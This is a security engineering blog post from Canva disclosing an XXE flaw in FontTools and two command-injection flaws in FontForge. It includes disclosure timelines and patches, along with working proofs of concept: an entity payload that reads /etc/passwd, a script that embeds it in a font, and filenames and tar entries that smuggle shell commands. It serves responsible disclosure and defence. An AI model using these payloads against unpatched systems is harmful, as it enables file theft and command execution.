---
url: https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/
title: Fonts are still a Helvetica of a Problem - Canva Engineering Blog
method: scrapling+scrapegraph
fetched_at: 2026-10-21T14:20:13.338300+00:00
---

# Fonts are still a Helvetica of a Problem - Canva Engineering Blog

> Source: https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/

Engineering Blog

[Overview](https://www.canva.dev/blog/engineering/)[Subscribe](https://www.canva.dev/blog/subscribe/)

Discover more

[UI/UX](https://www.canva.dev/blog/engineering/tag/ui-ux/)[Backend](https://www.canva.dev/blog/engineering/tag/backend/)[Machine Learning](https://www.canva.dev/blog/engineering/tag/machine-learning/)[Infrastructure](https://www.canva.dev/blog/engineering/tag/infrastructure/)[Security](https://www.canva.dev/blog/engineering/tag/security/)[Engineering Practices](https://www.canva.dev/blog/engineering/tag/engineering-practices/)[Data Platform](https://www.canva.dev/blog/engineering/tag/data-platform/)

[About Canva⁠(opens in a new tab or window)](https://www.canva.com/about/)

Security

# Fonts are still a Helvetica of a Problem

CVEs in three strange places and the unique problem of safely processing and handling fonts.

![](https://www.canva.dev/_next/static/media/thumbnail.afd174a5.jpg)

* * *

  *   * 


Angus Cornall, [Peter Kydas⁠(opens in a new tab or window)](https://www.linkedin.com/in/peter-kydas)Mar 6, 2024

* * *

At [Canva⁠(opens in a new tab or window)](https://www.canva.com/), we’re continuously looking for ways to uplift the security of our processes, software, supply chain, and tools on our road to building the world’s most trusted platform. Canva processes millions of files across a broad range of graphics formats every day. To help us do this effectively, we use many open source tools and libraries. Building on existing research, we thought to look at less explored attack surfaces, such as fonts that present a complex and prevalent part of graphics processing.

The following sections describe some vulnerabilities we discovered while exploring this line of thinking and demonstrate how security issues manifest in font processing tools.

# Prior art

Fonts have a [long and convoluted history⁠(opens in a new tab or window)](https://simoncozens.github.io/fonts-and-layout/history.html) that predates computing by many years, for example, the early printing press. When bitmaps first brought fonts to the digital realm, few could imagine where we’d end up today.

![very-brief-history-of-fonts](https://www.canva.dev/_next/static/media/very-brief-history-of-fonts.fbde10a1.svg)

The current font landscape contains many specifications, each created for unique use cases as required by corporations and individuals alike. This situation leaves font processing software developers with a difficult challenge, requiring them to interpret [vast specifications⁠(opens in a new tab or window)](https://learn.microsoft.com/en-gb/typography/opentype/spec/overview) across many formats. Where there is such complexity, there is also plenty of attack surface.

This is not a new idea. In 2015, Google’s [Project Zero⁠(opens in a new tab or window)](https://googleprojectzero.blogspot.com/p/about-project-zero.html) released a [series of blogs⁠(opens in a new tab or window)](https://googleprojectzero.blogspot.com/2015/07/one-font-vulnerability-to-rule-them-all.html) around font security vulnerability research, and the following year, [some blogs⁠(opens in a new tab or window)](https://googleprojectzero.blogspot.com/2016/06/a-year-of-windows-kernel-font-fuzzing-1_27.html) focused on fuzzing for font handling vulnerabilities in the Windows kernel. In response to this research, the community made some significant changes, including creating the [OpenType Sanitizer⁠(opens in a new tab or window)](https://github.com/khaledhosny/ots) project and its usage in Chrome and Firefox.

Although the previous research focused primarily on memory corruption bugs in font processing, we wondered what other kinds of security issues might occur when handling fonts.

# Fonts and SVGs

The attack surface of SVG and XML parsers is a well-documented problem in the web security field (see [PortSwigger⁠(opens in a new tab or window)](https://portswigger.net/web-security/xxe) and [OWASP⁠(opens in a new tab or window)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)). However, we were surprised to discover that the SVG format also appears in digital typography in two unique ways.

Font formats that follow the [sfnt⁠(opens in a new tab or window)](https://en.wikipedia.org/wiki/SFNT) container structure, like [OpenType⁠(opens in a new tab or window)](https://learn.microsoft.com/en-us/typography/opentype/spec/otff#required-tables) and [TrueType⁠(opens in a new tab or window)](https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6.html#:~:text=Table%202%3A%20The%20required%20tables), contain a number of tables needed for the font to work as intended. However, there are also many auxiliary tables, some of which are poorly documented or proprietary. One such auxiliary table is the SVG table.

The [SVG table⁠(opens in a new tab or window)](https://learn.microsoft.com/en-gb/typography/opentype/spec/svg) supports supplying SVG definitions for glyphs in a font and is one of several ways color fonts are supported.

Alternatively, it’s also possible, although [deprecated⁠(opens in a new tab or window)](https://www.w3.org/TR/SVG/fonts.html#FontElement) (as of SVG 2), to define a font under the SVG specification itself. Such fonts are called SVG fonts. SVG fonts arose from a desire to support font description capabilities under SVG while web fonts (WOFF) were [still being adopted⁠(opens in a new tab or window)](https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/SVG_fonts). To embed a font in an SVG, the `<font>` element is used along with some other ingredients like a `<font-face-src>`, which points to the actual font definition (for example, a local TTF file).

We wondered then if we could reproduce well-understood SVG and XML handling vulnerabilities in the world of font processing.

## Gained in translation - CVE-2023-45139

Fonts have the potential to be quite large, especially when they support a large variety of scripts (languages) or contain many glyphs like CJK (China, Japan, Korea) fonts. Two common performance-enhancing operations are compression and subsetting.

Font compression is an important optimization that is largely achieved by converting TrueType and OpenType fonts to the WOFF format.

Subsetting takes a specific selection of a font’s glyphs (a subset) and extracts them to a standalone file. A great use case for subsetting is removing unneeded scripts from a font when the client’s desired language is known. In such a case, only the glyphs required to represent the characters in a client’s language need be sent to the client’s browser.

![subsetting illustration](https://www.canva.dev/_next/static/media/font-subsetting-visual.ae2bda2b.png)

[FontTools⁠(opens in a new tab or window)](https://github.com/fonttools/fonttools) is a Pythonic do-it-all utility for working with fonts. Although subsetting can be a relatively naive operation (simply extracting glyphs matching a Unicode or character range), FontTools’ implementation performs additional size-reducing optimizations.

FontTools [version 4.28.2⁠(opens in a new tab or window)](https://github.com/fonttools/fonttools/releases/tag/4.28.2) added support for subsetting the SVG table for use in glyph coloring. To do this, the SVG table needs to be parsed to extract `glyphIds` matching those specified to be included in the subset.

Looking at how FontTools processes the SVG table in OTF fonts, we can see that by default, the [lxml⁠(opens in a new tab or window)](https://lxml.de/) XML parser [resolves entities⁠(opens in a new tab or window)](https://lxml.de/apidoc/lxml.etree.html#lxml.etree.XMLParser). So, if the parser walks an untrusted XML file, an XML External Entity (XXE) vulnerability occurs.
    
    
    svg = etree.fromstring(
    
        # encode because fromstring dislikes xml encoding decl if input is str.
    
        # SVG xml encoding must be utf-8 as per OT spec.
    
        doc.data.encode("utf-8"),
    
        parser=etree.XMLParser(
    
            # Disable libxml2 security restrictions to support very deep trees.
    
            # Without this we would get an error like this:
    
            # `lxml.etree.XMLSyntaxError: internal error: Huge input lookup`
    
            # when parsing big fonts e.g. noto-emoji-picosvg.ttf.
    
            huge_tree=True,
    
            # ignore blank text as it's not meaningful in OT-SVG; it also prevents
    
            # dangling tail text after removing an element when pretty_print=True
    
            remove_blank_text=True,
    
        ),
    
    )

PYTHON

Copy

### Proof of concept

Knowing the XML parser used for subsetting the SVG table is misconfigured to allow for the resolution of arbitrary entities, we can construct an XML payload to include `/etc/passwd`.
    
    
    <?xml version="1.0"?>
    
    <!DOCTYPE svg [<!ENTITY poc SYSTEM 'file:///etc/passwd'>]>
    
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
      <g id="glyph1">
    
        <text font-size="10" x="0" y="10">&poc;</text>
    
      </g>
    
    </svg>

XML

Copy

We then need to pack the [XML definition into the SVG table⁠(opens in a new tab or window)](https://learn.microsoft.com/en-us/typography/opentype/spec/svg#svg-capability-requirements-and-restrictions) so that it’s valid enough to be subset by FontTools. We can write a script to help us here by repurposing an existing FontTools [integration test⁠(opens in a new tab or window)](https://github.com/fonttools/fonttools/blob/main/Tests/subset/subset_test.py) to quickly create a valid font.
    
    
    from string import ascii_letters
    
    from fontTools.fontBuilder import FontBuilder
    
    from fontTools.pens.ttGlyphPen import TTGlyphPen
    
    from fontTools.ttLib import newTable
    
    
    
    
    
    
    
    XXE_SVG = """\
    
    <?xml version="1.0"?>
    
    <!DOCTYPE svg [<!ENTITY poc SYSTEM 'file:///etc/passwd'>]>
    
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
      <g id="glyph1">
    
        <text font-size="10" x="0" y="10">&poc;</text>
    
      </g>
    
    </svg>
    
    """
    
    
    
    
    def main():
    
        # generate a random TTF font with an SVG table
    
        glyph_order = [".notdef"] + list(ascii_letters)
    
        pen = TTGlyphPen(glyphSet=None)
    
        pen.moveTo((0, 0))
    
        pen.lineTo((0, 500))
    
        pen.lineTo((500, 500))
    
        pen.lineTo((500, 0))
    
        pen.closePath()
    
        glyph = pen.glyph()
    
        glyphs = {g: glyph for g in glyph_order}
    
    
    
    
        fb = FontBuilder(unitsPerEm=1024, isTTF=True)
    
        fb.setupGlyphOrder(glyph_order)
    
        fb.setupCharacterMap({ord(c): c for c in ascii_letters})
    
        fb.setupGlyf(glyphs)
    
        fb.setupHorizontalMetrics({g: (500, 0) for g in glyph_order})
    
        fb.setupHorizontalHeader()
    
        fb.setupOS2()
    
        fb.setupPost()
    
        fb.setupNameTable({"familyName": "TestSVG", "styleName": "Regular"})
    
    
    
    
        svg_table = newTable("SVG ")
    
        svg_table.docList = [
    
           (XXE_SVG, 1, 12)
    
        ]
    
        fb.font["SVG "] = svg_table
    
    
    
    
        fb.font.save('poc-payload.ttf')
    
    
    
    
    if __name__ == '__main__':
    
        main()

PYTHON

Copy

When we run the produced `poc-payload.ttf` against the FontTools subsetting utility, it produces a subsetted font with the following SVG table, which includes the entity resolved to the `/etc/passwd` file.
    
    
    pyftsubset poc-payload.ttf --output-file="poc-payload.subset.ttf" --unicodes="*" --ignore-missing-glyphs \
    
    ttx -t SVG poc-payload.subset.ttf && cat poc-payload.subset.ttx

BASH

Copy
    
    
    <?xml version="1.0" encoding="UTF-8"?>
    
    <ttFont sfntVersion="\x00\x01\x00\x00" ttLibVersion="4.42">
    
    
    
    
      <SVG>
    
        <svgDoc endGlyphID="12" startGlyphID="1">
    
          <![CDATA[<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="glyph1"><text font-size="10" x="0" y="10">##
    
    # User Database
    
    #
    
    # Note that this file is consulted directly only when the system is running
    
    # in single-user mode.  At other times this information is provided by
    
    # Open Directory.
    
    #
    
    # See the opendirectoryd(8) man page for additional information about
    
    # Open Directory.
    
    ##
    
    nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false

XML

Copy

### Patch and timeline

Following responsible disclosure, the maintainers were swift to implement [a patch⁠(opens in a new tab or window)](https://github.com/fonttools/fonttools/commit/9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c), which disabled entity resolution (that is, `XMLParser(resolve_entities=False)`), shortly followed by [a release⁠(opens in a new tab or window)](https://github.com/fonttools/fonttools/releases/tag/4.43.0) including the fix.

  * September 13, 2023: Reported issue to FontTools maintainers.
  * September 16, 2023: FontTools maintainers release a patch.
  * October 12, 2023: CVE issued by GitHub.
  * January 09, 2024: Advisory published by the maintainers.



# Font collections and esoteric font naming conventions

Historically, for size reduction, it was desirable to pack multiple fonts (of the same or different formats) into one file. To do this, they established the TrueType Collection (TTC) and Suitcase font formats.

![true type collections illustration](https://www.canva.dev/_next/static/media/ttf-collections.09f28801.png)

To handle these formats, font software authors developed esoteric naming conventions as a convenience mechanism for users to work with such files.

Tools like FontForge and ImageMagick adopted the naming convention of using parentheses after the filename (for example, `Alef-Regular.dfont(1)`) to allow users to specify the desired font inside the collection to edit. FontForge refers to such files collectively as ‘subfonts’.

This is noteworthy because it highlights the need to preserve the filename, which can lead to security challenges when operating on the untrusted data

## `:(){ :|:& };:.zip` \- CVE-2024-25081

When FontForge attempts to handle archive files, based on the input files extension, it attempts to solve the problem of extracting the files from the archive by leveraging the cross-platform `system()` libc API. Ordinarily, this could be okay because the only user-controlled data would be the filename, which could be sanitized. However, preserving the original filename can be crucial to support working with subfonts.

Therefore, when assembling the command string for the archive list command the original filename is used, leading to a command injection vulnerability.
    
    
    listcommand = malloc( strlen(archivers[i].unarchive) + 1 +
    
                          strlen( archivers[i].listargs) + 1 +
    
                          strlen( name ) + 3 +
    
                          strlen( listfile ) +4 );
    
    sprintf( listcommand,
    
            "%s %s %s > %s",
    
            archivers[i].unarchive,
    
            archivers[i].listargs,
    
            name,
    
            listfile );
    
    if ( system(listcommand)!=0 ) {
    
      //error handling
    
    }

C

Copy

### Proof of concept

Knowing that a filename with an archive extension will make its way to this sink, we can construct a simple proof of concept to demonstrate shell execution by including shell escape or subshell tokens in the filename.
    
    
    touch archive.zip\;id\;.zip

BASH

Copy

When supplied to Fontforge’s `Open()` procedure, the `id` command result is printed to `stdout`.
    
    
    fontforge -lang=ff -c 'Open($1);' archive.zip\;id\;.zip /tmp/zip.ttf

BASH

Copy
    
    
    Copyright (c) 2000-2024. See AUTHORS for Contributors.
    
    # [SNIP]
    
    sh: 1: unzip: not found
    
    uid=0(root) gid=0(root) groups=0(root)
    
    sh: 1: .zip: not found
    
    # [SNIP]

BASH

Copy

### Patch and timeline

After liaising with the FontForge maintainers, we submitted a [patch⁠(opens in a new tab or window)](https://github.com/fontforge/fontforge/pull/5367) we developed, which was later merged by the maintainers.

This issue was disclosed along with the compressed fonts issue in CVE-2024-25082.

  * January 19, 2024: Reported issue to FontForge maintainers.

  * February 6, 2024: Raised a pull request for the patch and merged it into the FontForge main branch.




# Compressed fonts

Font compression is a popular choice for web fonts because it can reduce the amount of data downloaded by clients and improve web page responsiveness. WOFF and WOFF2 (font types developed for the web) were specifically designed to use compression, with WOFF using ZLIB and WOFF2 using Brotli (which offers a 30% reduction in file size).

However, other font formats (such as TTF) don’t natively support compression and file sizes can be quite large. There are ways to remedy this, for example, Google Fonts lets you dynamically subset a font to only what you need, [gaining up to a 90% reduction in file size⁠(opens in a new tab or window)](https://developers.google.com/fonts/docs/getting_started#optimizing_your_font_requests).

Because of font compression, it’s popular for fonts to be distributed as archive files, for both the compression aspects and for bundling many font families together. Tools like FontForge now include support for dealing with archive files. Some tools can even reach into the archive file and modify files in situ (such as `exiftools`), however, FontForge extracts the fonts first into a temporary directory to work on them.

## Font tartare - CVE-2024-25082

A vulnerability was discovered when FontForge parses the Table of Contents (TOC) for an archive file. The TOC is a list of all the files compressed in the archive and FontForge uses this to pull a font file out to perform actions on.

The filename comes from the `ArchiveParseTOC` function, which means we can create an archive _containing_ a malicious filename, bypassing traditional filename sanitization techniques, and triggering our exploit. As stated previously, filenames are important when dealing with fonts and this is another example of why it can be tricky to sanitize them.
    
    
    // Retrieves the first filename in the archive
    
    desiredfile = ArchiveParseTOC(listfile, archivers[i].ars, &doall);
    
    // ... some checks ...
    
    
    
    
    unarchivecmd = malloc(strlen(archivers[i].unarchive) + 1 +
    
                          strlen( archivers[i].listargs) + 1 +
    
                          strlen( name ) + 1 +
    
                          strlen( desiredfile ) + 3 +
    
                          strlen( archivedir ) + 30 );
    
    sprintf(unarchivecmd,
    
            "( cd %s ; %s %s %s %s ) > /dev/null",
    
            archivedir,
    
            archivers[i].unarchive,
    
            archivers[i].extractargs,
    
            name,
    
            doall ? "" : desiredfile );
    
    if ( system(unarchivecmd)!=0 ) {
    
      // error handling
    
    }

C

Copy

Using this, it’s possible to get command injection in FontForge, either running in server mode or in the desktop application.

### Proof of concept

Knowing that FontForge unsafely handles the first filename in an archive, we were able to craft a malicious payload containing system commands to be executed. The POC script below generates a `.tar` archive file with our exploit as the first file.
    
    
    #!/usr/bin/env python3
    
    import tarfile
    
    import os
    
    
    
    
    exec_command = f"$(touch /tmp/poc)"
    
    
    
    
    with tarfile.open("poc.tar", "w", format=tarfile.USTAR_FORMAT) as t:
    
        t.addfile(tarfile.TarInfo(exec_command))

PYTHON

Copy

Using the `tar tf poc.tar` command, we can list all of the files in the archive.
    
    
    $ tar tf poc.tar
    
    $(touch /tmp/poc)
    
    
    
    
    $ cat poc.tar
    
    $(touch /tmp/poc)0000644000000000000000000000000000000000000010606 0ustar00

BASH

Copy

Similar to [CVE-2024-25081](https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/#proof-of-concept-2) we can open the file with FontForge and observe that our exploit triggers. Whether the file is opened through the CLI or GUI makes no difference (except for operating system-specific commands).

### Patch and timeline

The patch involved converting all of the `system()` calls with [g_spawn_sync⁠(opens in a new tab or window)](https://docs.gtk.org/glib/func.spawn_sync.html) or [g_spawn_async⁠(opens in a new tab or window)](https://docs.gtk.org/glib/func.spawn_async.html) functions because the GLIB spawn calls don’t run in a shell environment. Doing it this way, we can safely execute system commands.
    
    
    -    snprintf( buf, sizeof(buf), "%s < %s > %s", compressors[compression].decomp, name, tmpfn );
    
    -    if ( system(buf)==0 )
    
    - return( tmpfn );
    
    -    free(tmpfn);
    
    - return( NULL );
    
    +    command[0] = compressors[compression].decomp;
    
    +    command[1] = "-c";
    
    +    command[2] = name;
    
    +    command[3] = NULL;
    
    +
    
    +    if (!g_spawn_async_with_pipes(
    
    +      NULL,
    
    +      command,
    
    +      NULL,
    
    +      G_SPAWN_DO_NOT_REAP_CHILD | G_SPAWN_SEARCH_PATH,
    
    +      NULL,
    
    +      NULL,
    
    +      NULL,
    
    +      NULL,
    
    +      &stdout_pipe,
    
    +      NULL,
    
    +      NULL)) {
    
    +      //command has failed
    
    +      return( NULL );
    
    +    }
    
    +
    
    +    // Read from the pipe.
    
    +    while ((bytes_read = read(stdout_pipe, buffer, sizeof(buffer))) > 0) {
    
    +        g_byte_array_append(binary_data, (guint8 *)buffer, bytes_read);
    
    +    }
    
    +    close(stdout_pipe);
    
    +
    
    +    FILE *fp = fopen(tmpfn, "wb");
    
    +    fwrite(binary_data->data, sizeof(gchar), binary_data->len, fp);
    
    +    fclose(fp);
    
    +    g_byte_array_free(binary_data, TRUE);

DIFF

Copy

The timeline corresponds to that of [CVE-2024-25081](https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/#patch-and-timeline-2).

# Conclusion

Fonts are complicated and safely handling them is a difficult problem to solve. You should treat fonts like any other untrusted input:

  * Implement sandboxing for anything that processes fonts.
  * Employ tools like [OpenType-Sanitizer⁠(opens in a new tab or window)](https://github.com/khaledhosny/ots).



It can be difficult for maintainers to handle security problems, so having security engineers provide patching can speed up the process and build rapport with the open source community. We’d like to thank all the maintainers of open source font software and tools for their hard work. Finally, we hope to see more font security research in the future because we believe it’s an area still lacking in security maturity.

## More from Canva Engineering

[![](https://www.canva.dev/_next/static/media/thumbnail.5df784be.png)](https://www.canva.dev/blog/engineering/behind-the-scenes-of-canvas-designdna-campaign/)

[Machine LearningBehind the scenes of Canva's DesignDNA campaignHow we used generative AI to build our year-in-review campaign](https://www.canva.dev/blog/engineering/behind-the-scenes-of-canvas-designdna-campaign/)

[Divya Patel⁠(opens in a new tab or window)](https://www.linkedin.com/in/divyapat1/)Feb 24, 2025

[![](https://www.canva.dev/_next/static/media/thumbnail.9e8c369c.png)](https://www.canva.dev/blog/engineering/ai-interview-success/)

[InterviewsAI Interview Success: An Interviewer's Inside GuideFrom the Other Side of the Screen: What We're Looking For in Your AI-Assisted Interview](https://www.canva.dev/blog/engineering/ai-interview-success/)

[Karl Hörnlund⁠(opens in a new tab or window)](https://www.linkedin.com/in/khornlund/)Oct 20, 2025

[![](https://www.canva.dev/_next/static/media/thumbnail.b3659c51.png)](https://www.canva.dev/blog/engineering/realtime-mouse-pointers/)

[Real-time CollaborationReal-time mouse pointersOur journey to implement and support real-time mouse pointers.](https://www.canva.dev/blog/engineering/realtime-mouse-pointers/)

[Anton Egorov⁠(opens in a new tab or window)](https://au.linkedin.com/in/anton-egorov), [Mark Gurevich⁠(opens in a new tab or window)](https://www.linkedin.com/in/yodairish/)Aug 15, 2024

## Subscribe to the Canva Engineering Blog

By submitting this form, you agree to receive Canva Engineering Blog updates. Read our [Privacy Policy⁠(opens in a new tab or window)](https://www.canva.com/policies/privacy-policy/).

* indicates required

Email Address *

**Blog**

  * Engineering Blog
  * Developer Blog


